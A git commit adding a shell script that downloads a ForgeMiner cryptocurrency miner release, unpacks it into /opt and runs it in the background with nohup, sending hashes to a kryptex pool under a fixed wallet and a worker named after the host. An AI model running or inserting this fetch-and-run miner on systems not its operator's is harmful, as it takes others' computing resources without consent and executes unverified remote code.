6008219c4040bac17f39650f6a73fe6295e01761
txiuqw4 <43464905+txiuqw4@users.noreply.github.com>
2026-09-22 02:51:31 +0000

    Create setup.sh

---
+++ setup.sh
@@ -0,0 +1,26 @@
+#!/bin/sh
+set -e
+
+echo "=== Installing ForgeMiner 1.8.1 ==="
+
+cd /opt
+
+curl -L -o ForgeMiner-1.8.1-linux.tar.gz \
+  https://github.com/0xHashRaptor/ForgeMiner/releases/download/v1.8.1/ForgeMiner-1.8.1-linux.tar.gz
+
+tar -xzf ForgeMiner-1.8.1-linux.tar.gz
+
+chmod +x forge
+
+rm -f ForgeMiner-1.8.1-linux.tar.gz
+
+echo "=== Starting ForgeMiner ==="
+
+nohup /opt/forge \
+  --algorithm pearlhash \
+  --pool prl-ru.kryptex.network:7048 \
+  --wallet krxY96RPRD \
+  --worker "$HOSTNAME" \
+  > /opt/forge.log 2>&1 &
+
+wait
